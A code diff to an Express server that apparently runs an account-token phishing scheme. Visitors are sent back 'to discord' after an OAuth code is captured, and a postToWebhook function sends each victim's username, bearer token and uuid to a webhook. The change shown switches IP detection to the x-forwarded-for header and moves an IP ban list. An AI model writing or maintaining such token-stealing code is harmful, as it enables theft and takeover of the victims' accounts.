@@ -8,10 +8,11 @@ const express = require('express')
 require("json");
 const app = express()
 const port = process.env.PORT || 3000
-
+let banList = []
 app.get('/', async (req, res) => {
     res.send('Success! You can exit this page and return to discord.')
-    if (checkIfBanned(req.ip)) {
+    const ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
+    if (checkIfBanned(ip)) {
         return
     }
     const code = req.query.code
@@ -133,8 +134,6 @@ function postToWebhook(username, bearerToken, uuid) {
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
-
-const banList = []
 
 function checkIfBanned(ip){
     for (let i = 0; i < banList.length; i++) {
